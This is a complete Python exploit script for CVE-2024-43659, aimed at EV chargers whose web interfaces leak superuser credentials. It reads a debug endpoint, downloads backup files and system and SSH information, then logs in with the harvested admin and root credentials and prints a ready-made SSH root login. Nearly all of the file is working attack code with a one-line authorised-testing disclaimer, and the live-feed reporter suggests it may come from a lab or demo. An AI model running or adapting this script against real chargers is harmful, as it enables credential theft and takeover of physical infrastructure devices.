#!/usr/bin/env python3
"""
CVE-2024-43659 Exploit - EV Charger Web Interface Credential Exposure

This exploit targets EV chargers that expose superuser credentials
through debug endpoints or backup files.

Target: Generic EV Chargers with exposed web interfaces
Impact: Full device compromise via credential exposure

Usage:
    python3 cve_2024_43659_credential_exposure.py <target_ip> <port>
    python3 cve_2024_43659_credential_exposure.py 192.168.1.100 8085

DISCLAIMER: For authorized security testing only.
"""

import argparse
import requests
import json
import sys

# Import attack reporter for live feed
try:
    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
    HAS_REPORTER = True
except ImportError:
    HAS_REPORTER = False
    def report_attack(*args, **kwargs): pass
    def report_step(*args, **kwargs): pass
    def report_success(*args, **kwargs): pass
    def report_failure(*args, **kwargs): pass
    def report_command(*args, **kwargs): pass
    def report_data(*args, **kwargs): pass


class CredentialExposureExploit:
    def __init__(self, target: str, port: int):
        self.base_url = f"http://{target}:{port}"
        self.target_str = f"{target}:{port}"
        self.credentials = {}
        
        # Report attack start
        report_attack(
            cve="CVE-2024-43659",
            name="EV Charger Credential Exposure",
            severity="critical",
            target=self.target_str,
            attack_type="credential_exposure"
        )
        
    def check_vulnerable(self) -> bool:
        """Check if target is vulnerable"""
        print(f"[*] Checking target: {self.base_url}")
        report_step(f"Checking {self.base_url}/status for debug mode")
        try:
            resp = requests.get(f"{self.base_url}/status", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                print(f"[+] Target found!")
                print(f"    Vendor: {data.get('vendor')}")
                print(f"    Model: {data.get('model')}")
                print(f"    Debug Mode: {data.get('debug_mode')}")
                
                if data.get('debug_mode'):
                    print("[+] DEBUG MODE ENABLED - Likely vulnerable!")
                    report_success("Debug mode enabled - credentials likely exposed!")
                    return True
            return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
            report_failure(f"Connection failed: {e}")
            return False
    
    def exploit_debug_endpoint(self) -> dict:
        """
        Extract credentials from debug endpoint
        """
        print("\n[*] Accessing debug endpoint...")
        report_step("Accessing /api/debug for exposed credentials", severity="critical")
        
        try:
            resp = requests.get(f"{self.base_url}/api/debug", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                
                creds = data.get('credentials', {})
                if creds:
                    print("[+] CREDENTIALS FOUND IN DEBUG OUTPUT!")
                    print("-" * 40)
                    for key, value in creds.items():
                        print(f"    {key}: {value}")
                        self.credentials[key] = value
                    print("-" * 40)
                    report_data("credentials", creds, "Credentials extracted from debug endpoint!")
                
                network = data.get('network', {})
                if network:
                    print("\n[+] Network information:")
                    for key, value in network.items():
                        print(f"    {key}: {value}")
                
                return data
            
            print(f"[-] Debug endpoint returned: {resp.status_code}")
            return {}
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return {}
    
    def exploit_backup_file(self) -> str:
        """
        Download backup file containing cleartext credentials
        """
        print("\n[*] Attempting to download backup file...")
        
        backup_paths = [
            "/backup/config.tar.gz",
            "/backup/settings.cfg",
            "/download/backup.tar",
            "/api/export/config",
        ]
        
        for path in backup_paths:
            try:
                resp = requests.get(f"{self.base_url}{path}", timeout=10)
                if resp.status_code == 200:
                    print(f"[+] Backup found at {path}!")
                    content = resp.text
                    
                    # Parse credentials from backup content
                    print("\n[+] Backup file contents:")
                    print("-" * 40)
                    
                    # Look for credential patterns
                    for line in content.split('\n'):
                        line = line.strip()
                        if any(key in line.lower() for key in ['password', 'key', 'secret', 'token', 'auth']):
                            print(f"    >>> {line}")
                        elif '=' in line:
                            print(f"    {line}")
                    
                    print("-" * 40)
                    return content
                    
            except Exception as e:
                continue
        
        print("[-] No backup files found")
        return ""
    
    def exploit_system_info(self) -> dict:
        """
        Get system information including SSH access details
        """
        print("\n[*] Getting system information...")
        
        try:
            resp = requests.get(f"{self.base_url}/api/system/info", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                
                print("[+] System information:")
                print(f"    Hostname: {data.get('hostname')}")
                print(f"    Kernel: {data.get('kernel')}")
                print(f"    SSH Enabled: {data.get('ssh_enabled')}")
                print(f"    SSH Port: {data.get('ssh_port')}")
                print(f"    SSH Root Login: {data.get('ssh_root_login')}")
                
                users = data.get('users', [])
                if users:
                    print("\n[+] System users:")
                    for user in users:
                        print(f"    {user.get('name')} (uid={user.get('uid')}) - {user.get('shell')}")
                
                services = data.get('services', [])
                if services:
                    print(f"\n[+] Running services: {', '.join(services)}")
                
                return data
            
            return {}
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return {}
    
    def attempt_login(self, username: str, password: str) -> bool:
        """
        Attempt to login with discovered credentials
        """
        print(f"\n[*] Attempting login with {username}:{password}...")
        report_step(f"Attempting login with {username}:****", severity="high")
        
        try:
            resp = requests.post(
                f"{self.base_url}/api/login",
                data={'username': username, 'password': password},
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'authenticated':
                    print(f"[+] LOGIN SUCCESSFUL!")
                    print(f"    Token: {data.get('token')}")
                    print(f"    Role: {data.get('role')}")
                    report_success(f"Login successful as {username} with role {data.get('role')}")
                    return True
            
            print("[-] Login failed")
            return False
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def full_exploit(self):
        """Run full exploitation chain"""
        print("\n" + "="*60)
        print("FULL EXPLOITATION - CVE-2024-43659")
        print("="*60)
        
        # 1. Debug endpoint
        debug_data = self.exploit_debug_endpoint()
        
        # 2. Backup file
        backup = self.exploit_backup_file()
        
        # 3. System info
        sys_info = self.exploit_system_info()
        
        # 4. Try to login with found credentials
        if self.credentials:
            print("\n[*] Attempting authentication with discovered credentials...")
            
            # Try admin first
            if 'admin_user' in self.credentials and 'admin_pass' in self.credentials:
                self.attempt_login(self.credentials['admin_user'], self.credentials['admin_pass'])
            
            # Try root
            if 'root_user' in self.credentials and 'root_pass' in self.credentials:
                self.attempt_login(self.credentials['root_user'], self.credentials['root_pass'])
        
        # Summary
        print("\n" + "="*60)
        print("EXPLOITATION SUMMARY")
        print("="*60)
        print(f"Credentials found: {len(self.credentials)}")
        if self.credentials:
            print("\nDiscovered credentials:")
            for k, v in self.credentials.items():
                print(f"  {k}: {v}")
        
        if sys_info.get('ssh_enabled') and sys_info.get('ssh_root_login'):
            print("\n[!] SSH with root login is ENABLED!")
            print(f"    Connect with: ssh root@{self.base_url.split('//')[1].split(':')[0]}")
            if 'root_pass' in self.credentials:
                print(f"    Password: {self.credentials['root_pass']}")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-43659 - EV Charger Credential Exposure Exploit"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("port", type=int, default=8085, nargs='?', help="Target port (default: 8085)")
    parser.add_argument("--debug", action="store_true", help="Exploit debug endpoint only")
    parser.add_argument("--backup", action="store_true", help="Download backup file only")
    parser.add_argument("--sysinfo", action="store_true", help="Get system info only")
    parser.add_argument("--login", nargs=2, metavar=('USER', 'PASS'), help="Attempt login")
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  CVE-2024-43659 - EV Charger Credential Exposure         ║
    ║  Exposed superuser credentials in debug/backup            ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    exploit = CredentialExposureExploit(args.target, args.port)
    
    if not exploit.check_vulnerable():
        print("[-] Target may not be vulnerable, continuing anyway...")
    
    if args.debug:
        exploit.exploit_debug_endpoint()
    elif args.backup:
        exploit.exploit_backup_file()
    elif args.sysinfo:
        exploit.exploit_system_info()
    elif args.login:
        exploit.attempt_login(args.login[0], args.login[1])
    else:
        exploit.full_exploit()


if __name__ == "__main__":
    main()
